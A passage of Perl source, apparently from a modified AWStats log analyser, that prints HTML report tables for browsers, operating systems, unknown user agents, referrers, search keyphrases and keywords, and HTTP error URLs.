		if ( ( $bredde_p == 1 ) && $_browser_p{$key} ) {
			$bredde_p = 2;
		}
		print "<td>" . Format_Number($_browser_p{$key}) . "</td><td>$p_p</td>\n";
		print "<td>" . Format_Number($_browser_h{$key}) . "</td><td>$p_h</td>\n";
		print "<td class=\"aws\">";

		# alt and title are not provided to reduce page size
		if ($ShowBrowsersStats) {
			print "<div style=\"background-color: #$color_p; width: ${bredde_p}px; height: 5px; border-radius: 3px;\"></div>";
			print "<div style=\"background-color: #$color_h; width: ${bredde_h}px; height: 5px; border-radius: 3px;\"></div>";
		}
		print "</td>\n";
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Unknown Browser Detail frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowBrowserUnknown{
	my $NewLinkTarget = shift;
	print "$Center<a name=\"unknownbrowser\">&nbsp;</a>";
	my $title = _t("Unknown Robot RH");
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
	   # extend the title to include the added link 
		   $title = "$title &nbsp; - &nbsp; <a href=\"" 
		   . (XMLEncode( "$AddLinkToExternalCGIWrapper" 
		   . "?section=UNKNOWNREFERERBROWSER&baseName=$DirData/$PROG"
		   . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		   . "&siteConfig=$SiteConfig" )
		   . "\"$NewLinkTarget>" . _t("Export") . "</a>");
	} 
	&tab_head( "$title", 19, 0, 'unknownbrowser' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("User agent") . " ("
	  . ( scalar keys %_unknownrefererbrowser_l )
	  . ")</th><th>" . _t("Last") . "</th></tr>\n";
	my $total_l = 0;
	my $count = 0;
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_unknownrefererbrowser_l, \%_unknownrefererbrowser_l );
	foreach my $key (@keylist) {
		my $useragent = XMLEncode( CleanXSS($key) );
		print
		  "<tr><td class=\"aws\">$useragent</td><td nowrap=\"nowrap\">"
		  . Format_Date( $_unknownrefererbrowser_l{$key}, 1 )
		  . "</td>\n</tr>\n";
		$total_l += 1;
		$count++;
	}
	my $rest_l = ( scalar keys %_unknownrefererbrowser_l ) - $total_l;
	if ( $rest_l > 0 ) {
		print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others (unknown browsers)") . "</span></td>\n";
		print "<td>-</td>\n";
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the OS Detail frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowOSDetail{
	# Show os versions
	print "$Center<a name=\"osversions\">&nbsp;</a>";
	my $title = _t("Operating Systems");
	&tab_head( "$title", 19, 0, 'osversions' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">" . _t("Detailed") . "</th>\n";
	print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>\n";
	print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>\n";
	print "</tr>\n";
	my $total_h = 0;
	my $total_p = 0;
	my $count = 0;
	&BuildKeyList( MinimumButNoZero( scalar keys %_os_h, 500 ),
		1, \%_os_h, \%_os_p );
	my %keysinkeylist = ();
	my $max_h = 1;
	my $max_p = 1;

	# Count total by family
	my %totalfamily_h = ();
	my %totalfamily_p = ();
	my $TotalFamily_h = 0;
	my $TotalFamily_p = 0;
  OSLOOP: foreach my $key (@keylist) {
		$total_h += $_os_h{$key};
		$total_p += $_os_p{$key};
		if ( $_os_h{$key} > $max_h ) { $max_h = $_os_h{$key}; }
		if ( $_os_p{$key} > $max_p ) { $max_p = $_os_p{$key}; }
		foreach my $family ( keys %OSFamily ) {
			if ( $key =~ /^$family/i ) {
				$totalfamily_h{$family} += $_os_h{$key};
				$totalfamily_p{$family} += $_os_p{$key};
				$TotalFamily_h          += $_os_h{$key};
				$TotalFamily_p          += $_os_p{$key};
				next OSLOOP;
			}
		}
	}

	# Write records grouped in a browser family
	foreach my $family ( keys %OSFamily ) {
		my $p_h = '&nbsp;';
		my $p_p = '&nbsp;';
		if ($total_h) {
			$p_h = int( $totalfamily_h{$family} / $total_h * 1000 ) / 10;
			$p_h = "$p_h %";
		}
		if ($total_p) {
			$p_p = int( $totalfamily_p{$family} / $total_p * 1000 ) / 10;
			$p_p = "$p_p %";
		}
		my $familyheadershown = 0;
		foreach my $key ( reverse sort keys %_os_h ) {
			if ( $key =~ /^$family(.*)/i ) {
				if ( !$familyheadershown ) {
					my $family_name = '';
					if ( $OSFamily{$family} ) {
						$family_name = $OSFamily{$family};
					}
					print "<tr bgcolor=\"#F6F6F6\"><td class=\"aws\" colspan=\"2\"><b>$family_name</b></td>\n";
					print "<td><b>"
					  . Format_Number(int( $totalfamily_p{$family} ))
					  . "</b></td><td><b>$p_p</b></td>\n";
					print "<td><b>"
					  . Format_Number(int( $totalfamily_h{$family} ))
					  . "</b></td><td><b>$p_h</b></td><td>&nbsp;</td>\n";
					print "</tr>\n";
					$familyheadershown = 1;
				}
				$keysinkeylist{$key} = 1;
				my $ver = $1;
				my $p_h = '&nbsp;';
				my $p_p = '&nbsp;';
				if ($total_h) {
					$p_h = int( $_os_h{$key} / $total_h * 1000 ) / 10;
					$p_h = "$p_h %";
				}
				if ($total_p) {
					$p_p = int( $_os_p{$key} / $total_p * 1000 ) / 10;
					$p_p = "$p_p %";
				}

				# 获取映射后的图标名称
				my $icon_key = $key;
				if (defined $OSHashID{$key}) {
					$icon_key = $OSHashID{$key};
				}
				$icon_key =~ s/[^\w\-]//g;
				print "<tr>";
				print "<td"
					. ( $count ? "" : " width=\"$WIDTHCOLICON\" style=\"text-align:center; vertical-align:middle;\"" )
					. "><img src=\"$DirIcons\/os\/$icon_key.svg\""
					. AltTitle("")
					. " width=\"24\" height=\"auto\" style=\"vertical-align:middle; object-fit:contain;\" /></td>\n";

				print "<td class=\"aws\">$OSHashLib{$key}</td>\n";
				my $bredde_h = 0;
				my $bredde_p = 0;
				if ( $max_h > 0 ) {
					$bredde_h =
					  int( $BarWidth * ( $_os_h{$key} || 0 ) / $max_h )
					  + 1;
				}
				if ( ( $bredde_h == 1 ) && $_os_h{$key} ) {
					$bredde_h = 2;
				}
				if ( $max_p > 0 ) {
					$bredde_p =
					  int( $BarWidth * ( $_os_p{$key} || 0 ) / $max_p )
					  + 1;
				}
				if ( ( $bredde_p == 1 ) && $_os_p{$key} ) {
					$bredde_p = 2;
				}
				print "<td>".Format_Number($_os_p{$key})."</td><td>$p_p</td>\n";
				print "<td>".Format_Number($_os_h{$key})."</td><td>$p_h</td>\n";
				print "<td class=\"aws\">";

				# alt and title are not provided to reduce page size
				if ($ShowOSStats) {
					print "<div style=\"background-color: #$color_p; width: ${bredde_p}px; height: 5px; border-radius: 3px;\"></div>";
					print "<div style=\"background-color: #$color_h; width: ${bredde_h}px; height: 5px; border-radius: 3px;\"></div>";
				}
				print "</td>\n";
				print "</tr>\n";
				$count++;
			}
		}
	}

	# Write other records
	my $familyheadershown = 0;
	foreach my $key (@keylist) {
		if ( $keysinkeylist{$key} ) { next; }
		if ( !$familyheadershown )  {
			my $p_h = '&nbsp;';
			my $p_p = '&nbsp;';
			if ($total_h) {
				$p_h =
				  int( ( $total_h - $TotalFamily_h ) / $total_h * 1000 ) /
				  10;
				$p_h = "$p_h %";
			}
			if ($total_p) {
				$p_p =
				  int( ( $total_p - $TotalFamily_p ) / $total_p * 1000 ) /
				  10;
				$p_p = "$p_p %";
			}
			print "<tr bgcolor=\"#F6F6F6\"><td class=\"aws\" colspan=\"2\"><b>" . _t("Others (operating systems)") . "</b></td>\n";
			print "<td><b>"
			  . Format_Number(( $total_p - $TotalFamily_p ))
			  . "</b></td><td><b>$p_p</b></td>\n";
			print "<td><b>"
			  . Format_Number(( $total_h - $TotalFamily_h ))
			  . "</b></td><td><b>$p_h</b></td><td>&nbsp;</td>\n";
			print "</tr>\n";
			$familyheadershown = 1;
		}
		my $p_h = '&nbsp;';
		my $p_p = '&nbsp;';
		if ($total_h) {
			$p_h = int( $_os_h{$key} / $total_h * 1000 ) / 10;
			$p_h = "$p_h %";
		}
		if ($total_p) {
			$p_p = int( $_os_p{$key} / $total_p * 1000 ) / 10;
			$p_p = "$p_p %";
		}
		print "<tr>";
		
		# 处理设备类型
		my ($is_device, $display_name, $icon_name) = parse_device_key($key);
		
		if ( $key eq 'Unknown' ) {
			print "<td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/os\/unknown.svg\""
			  . AltTitle("")
			  . " width=\"24\" height=\"auto\" style=\"vertical-align:middle; object-fit:contain;\" /></td><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Unknown OS") . "</span></td>\n";
		}
		elsif ($is_device) {
			print "<td"
				. ( $count ? "" : " width=\"$WIDTHCOLICON\" style=\"text-align:center; vertical-align:middle;\"" )
				. "><span style=\"font-size:24px;\">$icon_name</span>"
				. "</td><td class=\"aws\">$display_name</td>\n";
		}
		else {
			my $keywithoutcumul = $key;
			$keywithoutcumul =~ s/cumul$//i;
			my $libos = $OSHashLib{$keywithoutcumul} || $keywithoutcumul;
			my $icon_key = $keywithoutcumul;
			if (defined $OSHashID{$icon_key}) {
				$icon_key = $OSHashID{$icon_key};
			}
			$icon_key =~ s/[^\w\-]//g;
			print "<td"
				. ( $count ? "" : " width=\"$WIDTHCOLICON\" style=\"text-align:center; vertical-align:middle;\"" )
				. "><img src=\"$DirIcons\/os\/$icon_key.svg\""
				. AltTitle("")
				. " width=\"24\" height=\"auto\" style=\"vertical-align:middle; object-fit:contain;\" /></td><td class=\"aws\">$libos</td>\n";
		}

		my $bredde_h = 0;
		my $bredde_p = 0;
		if ( $max_h > 0 ) {
			$bredde_h =
			  int( $BarWidth * ( $_os_h{$key} || 0 ) / $max_h ) + 1;
		}
		if ( ( $bredde_h == 1 ) && $_os_h{$key} ) { $bredde_h = 2; }
		if ( $max_p > 0 ) {
			$bredde_p =
			  int( $BarWidth * ( $_os_p{$key} || 0 ) / $max_p ) + 1;
		}
		if ( ( $bredde_p == 1 ) && $_os_p{$key} ) { $bredde_p = 2; }
		print "<td>".Format_Number($_os_p{$key})."</td><td>$p_p</td>\n";
		print "<td>".Format_Number($_os_h{$key})."</td><td>$p_h</td>\n";
		print "<td class=\"aws\">";

		# alt and title are not provided to reduce page size
		if ($ShowOSStats) {
			print "<div style=\"background-color: #$color_p; width: ${bredde_p}px; height: 5px; border-radius: 3px;\"></div>";
			print "<div style=\"background-color: #$color_h; width: ${bredde_h}px; height: 5px; border-radius: 3px;\"></div>";
		}
		print "</td>\n";
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Unknown OS Detail frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowOSUnknown{
	my $NewLinkTarget = shift;
	print "$Center<a name=\"unknownos\">&nbsp;</a>";
	my $title = _t("Unknown Robot");
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
	   # extend the title to include the added link 
		   $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
			   "$AddLinkToExternalCGIWrapper" . "?section=UNKNOWNREFERER&baseName=$DirData/$PROG"
		   . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		   . "&siteConfig=$SiteConfig" )
		   . "\"$NewLinkTarget>" . _t("Export") . "</a>");
	} 
	&tab_head( "$title", 19, 0, 'unknownos' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("User agent") . " ("
	  . ( scalar keys %_unknownreferer_l )
	  . ")</th><th>" . _t("Last") . "</th></tr>\n";
	my $total_l = 0;
	my $count = 0;
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_unknownreferer_l,
		\%_unknownreferer_l );
	foreach my $key (@keylist) {
		my $useragent = XMLEncode( CleanXSS($key) );
		print "<tr><td class=\"aws\">$useragent</td>\n";
		print "<td nowrap=\"nowrap\">"
		  . Format_Date( $_unknownreferer_l{$key}, 1 ) . "</td>\n";
		print "</tr>\n";
		$total_l += 1;
		$count++;
	}
	my $rest_l = ( scalar keys %_unknownreferer_l ) - $total_l;
	if ( $rest_l > 0 ) {
		print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others (unknown OS)") . "</span></td>\n";
		print "<td>-</td>\n";
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Referers frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowReferers{
	my $NewLinkTarget = shift;
	print "$Center<a name=\"refererse\">&nbsp;</a>";
	my $title = _t("Refering search engines");
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
	   # extend the title to include the added link 
		   $title = "$title &nbsp; - &nbsp; <a href=\"" 
		   . (XMLEncode( "$AddLinkToExternalCGIWrapper" 
		   . "?section=SEREFERRALS&baseName=$DirData/$PROG"
		   . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		   . "&siteConfig=$SiteConfig" )
		   . "\"$NewLinkTarget>" . _t("Export") . "</a>");
	} 
	&tab_head( $title, 19, 0, 'refererse' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>".Format_Number($TotalDifferentSearchEngines)." " . _t("Refering pages") . "</th>\n";
	print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>\n";
	print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>\n";
	print "</tr>\n";
	my $total_s = 0;
	my $total_p = 0;
	my $total_h = 0;
	my $rest_p = 0;
	my $rest_h = 0;
	my $count = 0;
	&BuildKeyList(
		$MaxRowsInHTMLOutput,
		$MinHit{'Refer'},
		\%_se_referrals_h,
		(
			( scalar keys %_se_referrals_p )
			? \%_se_referrals_p
			: \%_se_referrals_h
		)
	);    # before 5.4 only hits were recorded

	foreach my $key (@keylist) {
		my $newreferer = $SearchEnginesHashLib{$key} || CleanXSS($key);
		my $p_p;
		my $p_h;
		if ($TotalSearchEnginesPages) {
			$p_p =
			  int( $_se_referrals_p{$key} / $TotalSearchEnginesPages *
				  1000 ) / 10;
		}
		if ($TotalSearchEnginesHits) {
			$p_h =
			  int( $_se_referrals_h{$key} / $TotalSearchEnginesHits *
				  1000 ) / 10;
		}
		print "<tr><td class=\"aws\">$newreferer</td>\n";
		print "<td>"
		  . (
			$_se_referrals_p{$key} ? $_se_referrals_p{$key} : '&nbsp;' )
		  . "</td>\n";
		print "<td>"
		  . ( $_se_referrals_p{$key} ? "$p_p %" : '&nbsp;' ) . "</td>\n";
		print "<td>".Format_Number($_se_referrals_h{$key})."</td>\n";
		print "<td>$p_h %</td>\n";
		print "</tr>\n";
		$total_p += $_se_referrals_p{$key};
		$total_h += $_se_referrals_h{$key};
		$count++;
	}
	if ($Debug) {
		debug( "Total real / shown : $TotalSearchEnginesPages / $total_p - $TotalSearchEnginesHits / $total_h", 2 );
	}
	$rest_p = $TotalSearchEnginesPages - $total_p;
	$rest_h = $TotalSearchEnginesHits - $total_h;
	if ( $rest_p > 0 || $rest_h > 0 ) {
		my $p_p;
		my $p_h;
		if ($TotalSearchEnginesPages) {
			$p_p =
			  int( $rest_p / $TotalSearchEnginesPages * 1000 ) / 10;
		}
		if ($TotalSearchEnginesHits) {
			$p_h = int( $rest_h / $TotalSearchEnginesHits * 1000 ) / 10;
		}
		print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others (search engines)") . "</span></td>\n";
		print "<td>" . ( $rest_p ? Format_Number($rest_p)  : '&nbsp;' ) . "</td>\n";
		print "<td>" . ( $rest_p ? "$p_p %" : '&nbsp;' ) . "</td>\n";
		print "<td>".Format_Number($rest_h)."</td>\n";
		print "<td>$p_h %</td>\n";
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Referer Pages frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowRefererPages{
	my $NewLinkTarget = shift;
	print "$Center<a name=\"refererpages\">&nbsp;</a>";
	my $total_p = 0;
	my $total_h = 0;
	my $rest_p = 0;
	my $rest_h = 0;

	# Show filter form
	&HTMLShowFormFilter(
		"refererpagesfilter",
		$FilterIn{'refererpages'},
		$FilterEx{'refererpages'}
	);
	my $title = _t("Refering pages");
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
	   # extend the title to include the added link 
		   $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
			   "$AddLinkToExternalCGIWrapper" . "?section=PAGEREFS&baseName=$DirData/$PROG"
		   . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		   . "&siteConfig=$SiteConfig" )
		   . "\"$NewLinkTarget>" . _t("Export") . "</a>");
	}
	my $cpt   = 0;
	$cpt = ( scalar keys %_pagesrefs_h );
	&tab_head( "$title", 19, 0, 'refererpages' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>";
	if ( $FilterIn{'refererpages'} || $FilterEx{'refererpages'} ) {

		if ( $FilterIn{'refererpages'} ) {
			print _t("Filter") . " <b>$FilterIn{'refererpages'}</b>";
		}
		if ( $FilterIn{'refererpages'} && $FilterEx{'refererpages'} ) {
			print " - ";
		}
		if ( $FilterEx{'refererpages'} ) {
			print
			  _t("Exclude filter") . " <b>$FilterEx{'refererpages'}</b>";
		}
		if ( $FilterIn{'refererpages'} || $FilterEx{'refererpages'} ) {
			print ": ";
		}
		print "$cpt " . _t("Different refering pages");

		#if ($MonthRequired ne 'all') {
		#	if ($HTMLOutput{'refererpages'}) { print "<br>$Message[102]: $TotalDifferentPages $Message[28]"; }
		#}
	}
	else { print _t("Total") . ": ".Format_Number($cpt)." " . _t("Different refering pages"); }
	print "</th>\n";
	print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>\n";
	print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>\n";
	print "</tr>\n";
	my $total_s = 0;
	my $count = 0;
	&BuildKeyList(
		$MaxRowsInHTMLOutput,
		$MinHit{'Refer'},
		\%_pagesrefs_h,
		(
			( scalar keys %_pagesrefs_p )
			? \%_pagesrefs_p
			: \%_pagesrefs_h
		)
	);

	foreach my $key (@keylist) {
		my $nompage = CleanXSS($key);
		if ( length($nompage) > $MaxLengthOfShownURL ) {
			$nompage =
			  substr( $nompage, 0, $MaxLengthOfShownURL ) . "...";
		}
		my $p_p;
		my $p_h;
		if ($TotalRefererPages) {
			$p_p =
			  int( $_pagesrefs_p{$key} / $TotalRefererPages * 1000 ) /
			  10;
		}
		if ($TotalRefererHits) {
			$p_h =
			  int( $_pagesrefs_h{$key} / $TotalRefererHits * 1000 ) /
			  10;
		}
		print "<tr><td class=\"aws\">";
		&HTMLShowURLInfo($key);
		print "</td>\n";
		print "<td>"
		  . ( $_pagesrefs_p{$key} ? Format_Number($_pagesrefs_p{$key}) : '&nbsp;' )
		  . "</td><td>"
		  . ( $_pagesrefs_p{$key} ? "$p_p %" : '&nbsp;' ) . "</td>\n";
		print "<td>"
		  . ( $_pagesrefs_h{$key} ? Format_Number($_pagesrefs_h{$key}) : '&nbsp;' )
		  . "</td><td>"
		  . ( $_pagesrefs_h{$key} ? "$p_h %" : '&nbsp;' ) . "</td>\n";
		print "</tr>\n";
		$total_p += $_pagesrefs_p{$key};
		$total_h += $_pagesrefs_h{$key};
		$count++;
	}
	if ($Debug) {
		debug( "Total real / shown : $TotalRefererPages / $total_p - $TotalRefererHits / $total_h", 2 );
	}
	$rest_p = $TotalRefererPages - $total_p;
	$rest_h = $TotalRefererHits - $total_h;
	if ( $rest_p > 0 || $rest_h > 0 ) {
		my $p_p;
		my $p_h;
		if ($TotalRefererPages) {
			$p_p = int( $rest_p / $TotalRefererPages * 1000 ) / 10;
		}
		if ($TotalRefererHits) {
			$p_h = int( $rest_h / $TotalRefererHits * 1000 ) / 10;
		}
		print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others (referring pages)") . "</span></td>\n";
		print "<td>" . ( $rest_p ? Format_Number($rest_p)  : '&nbsp;' ) . "</td>\n";
		print "<td>" . ( $rest_p ? "$p_p %" : '&nbsp;' ) . "</td>\n";
		print "<td>".Format_Number($rest_h)."</td>\n";
		print "<td>$p_h %</td>\n";
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Key Phrases frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowKeyPhrases{
	my $NewLinkTarget = shift;
	print "$Center<a name=\"keyphrases\">&nbsp;</a>";
	my $title = _t("Keyphrases");
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
	   # extend the title to include the added link 
		   $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
			   "$AddLinkToExternalCGIWrapper" . "?section=SEARCHWORDS&baseName=$DirData/$PROG"
		   . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		   . "&siteConfig=$SiteConfig" )
		   . "\"$NewLinkTarget>" . _t("Export") . "</a>");
	} 
	&tab_head( $title, 19, 0, 'keyphrases' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\""
	  . Tooltip(15)
	  . "><th>".Format_Number($TotalDifferentKeyphrases)." " . _t("Different keyphrases") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Percent") . "</th></tr>\n";
	my $total_s = 0;
	my $count = 0;
	&BuildKeyList(
		$MaxRowsInHTMLOutput, $MinHit{'Keyphrase'},
		\%_keyphrases,        \%_keyphrases
	);
	foreach my $key (@keylist) {
		my $mot;
  		# Convert coded keywords (utf8,...) to be correctly reported in HTML page.
		if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
			$mot = CleanXSS(
				DecodeKey_decodeutfkeys(
					$key, $PageCode || 'iso-8859-1'
				)
			);
		}
		else { $mot = CleanXSS( DecodeEncodedString($key) ); }
		my $p;
		if ($TotalKeyphrases) {
			$p =
			  int( $_keyphrases{$key} / $TotalKeyphrases * 1000 ) / 10;
		}
		print "<tr><td class=\"aws\">"
		  . XMLEncode($mot)
		  . "</td><td>$_keyphrases{$key}</td><td>$p %</td>\n</tr>\n";
		$total_s += $_keyphrases{$key};
		$count++;
	}
	if ($Debug) {
		debug( "Total real / shown : $TotalKeyphrases / $total_s", 2 );
	}
	my $rest_s = $TotalKeyphrases - $total_s;
	if ( $rest_s > 0 ) {
		my $p;
		if ($TotalKeyphrases) {
			$p = int( $rest_s / $TotalKeyphrases * 1000 ) / 10;
		}
		print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others (keyphrases)") . "</span></td><td>".Format_Number($rest_s)."</td>\n";
				print "<td>$p %</td>\n</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Keywords frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowKeywords{
	my $NewLinkTarget = shift;
	print "$Center<a name=\"keywords\">&nbsp;</a>";
	my $title = _t("Keywords");
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
	   # extend the title to include the added link 
		   $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
			   "$AddLinkToExternalCGIWrapper" . "?section=KEYWORDS&baseName=$DirData/$PROG"
		   . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		   . "&siteConfig=$SiteConfig" )
		   . "\"$NewLinkTarget>" . _t("Export") . "</a>");
	} 
	&tab_head( $title, 19, 0, 'keywords' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\""
	  . Tooltip(15)
	  . "><th>".Format_Number($TotalDifferentKeywords)." " . _t("Different keywords") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Percent") . "</th></tr>\n";
	my $total_s = 0;
	my $count = 0;
	&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Keyword'},
		\%_keywords, \%_keywords );
	foreach my $key (@keylist) {
		my $mot;
  		# Convert coded keywords (utf8,...) to be correctly reported in HTML page.
		if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
			$mot = CleanXSS(
				DecodeKey_decodeutfkeys(
					$key, $PageCode || 'iso-8859-1'
				)
			);
		}
		else { $mot = CleanXSS( DecodeEncodedString($key) ); }
		my $p;
		if ($TotalKeywords) {
			$p = int( $_keywords{$key} / $TotalKeywords * 1000 ) / 10;
		}
		print "<tr><td class=\"aws\">"
		  . XMLEncode($mot)
		  . "</td><td>$_keywords{$key}</td><td>$p %</td>\n</tr>\n";
		$total_s += $_keywords{$key};
		$count++;
	}
	if ($Debug) {
		debug( "Total real / shown : $TotalKeywords / $total_s", 2 );
	}
	my $rest_s = $TotalKeywords - $total_s;
	if ( $rest_s > 0 ) {
		my $p;
		if ($TotalKeywords) {
			$p = int( $rest_s / $TotalKeywords * 1000 ) / 10;
		}
		print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others (keywords)") . "</span></td><td>".Format_Number($rest_s)."</td>\n";
		print "<td>$p %</td>\n</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the HTTP Error code frame or static page
# Parameters:   $code - the error code we're printing
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowErrorCodes{
	my $code = shift;
	my $title;
	my %customtitles = ( "404", _t("Page not found") );
	$title = $customtitles{$code} ? $customtitles{$code} :
			   (join(' ', ( ($httpcodelib{$code} ? $httpcodelib{$code} :
			   _t("Unknown error") ), "urls (HTTP code " . $code . ")" )));
	print "$Center<a name=\"errors$code\">&nbsp;</a>";
	&tab_head( $title, 19, 0, "errors$code" );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("URL") . " ("
	  . Format_Number(( scalar keys %{$_sider_h{$code}} ))
	  . ")</th><th bgcolor=\"#$color_h\">" . _t("Hits") . "</th>\n";
	foreach (split(//, $ShowHTTPErrorsPageDetail)) {
		if ( $_ =~ /R/i ) {
			print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Referer") . "</th>\n";
		} elsif ( $_ =~ /H/i ) {
			print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Host") . "</th>\n";
		}
	}
	print "</tr>\n";
	my $total_h = 0;
	my $count = 0;
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%{$_sider_h{$code}},
		\%{$_sider_h{$code}} );
	foreach my $key (@keylist) {
		my $nompage = XMLEncode( CleanXSS($key) );

		#if (length($nompage)>$MaxLengthOfShownURL) { $nompage=substr($nompage,0,$MaxLengthOfShownURL)."..."; }
		my $referer = XMLEncode( CleanXSS( $_referer_h{$code}{$key} ) );
		my $host = XMLEncode( CleanXSS( $_err_host_h{$code}{$key} ) );
		print "<tr><td class=\"aws\">$nompage</td>\n";
		print "<td>".Format_Number($_sider_h{$code}{$key})."</td>\n";
		foreach (split(//, $ShowHTTPErrorsPageDetail)) {
			if ( $_ =~ /R/i ) {
				print "<td class=\"aws\">" . ( $referer ? "$referer" : "&nbsp;" ) . "</td>\n";
			} elsif ( $_ =~ /H/i ) {
				print "<td class=\"aws\">" . ( $host ? "$host" : "&nbsp;" ) . "</td>\n";
			}
		}
		print "</tr>\n";
		my $total_s += $_sider_h{$code}{$key};
		$count++;
	}

# TODO Build TotalErrorHits
#			if ($Debug) { debug("Total real / shown : $TotalErrorHits / $total_h",2); }
#			$rest_h=$TotalErrorHits-$total_h;
#			if ($rest_h > 0) {
#				my $p;
#				if ($TotalErrorHits) { $p=int($rest_h/$TotalErrorHits*1000)/10; }
#				print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[30]</span></td>\n";
#				print "<td>$rest_h</td>\n";
#				print "<td>...</td>\n";
#				print "</tr>\n";
#			}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Loops through any defined extra sections and dumps the info to HTML
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowExtraSections{
	foreach my $extranum ( 1 .. @ExtraName - 1 ) {
		my $total_p = 0;
		my $total_h = 0;
		my $total_k = 0;
		
		if ( $HTMLOutput{"allextra$extranum"} ) {
			if ($Debug) { debug( "ExtraName$extranum", 2 ); }
